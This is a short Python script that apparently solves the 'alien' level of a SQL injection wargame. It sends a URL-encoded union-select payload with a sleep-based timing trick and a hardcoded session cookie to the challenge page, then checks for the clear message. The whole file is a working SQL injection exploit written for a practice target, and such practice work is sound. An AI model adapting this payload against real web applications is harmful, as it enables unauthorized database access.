import requests

url = 'https://los.rubiya.kr/chall/alien_91104597bf79b4d893425b65c166d484.php?'
cookie = {'PHPSESSID':'2cus8abp8eb3greqqsrpgoupla'}

def solve():
    query = 'no=0%20union%20select%20concat(mid(%22as%22%2C1%2B(now()%252%3Dsleep(1))%2C1)%2C%22dmin%22)%23%27%20union%20select%20concat(mid(%22sa%22%2C1%2B(now()%252%3Dsleep(1))%2C1)%2C%22dmin%22)%23'
    res = requests.get(url=url+query,cookies=cookie)
    if "ALIEN Clear!" in res.text:
        print("ALIEN Clear!")

if __name__ == "__main__":
    solve()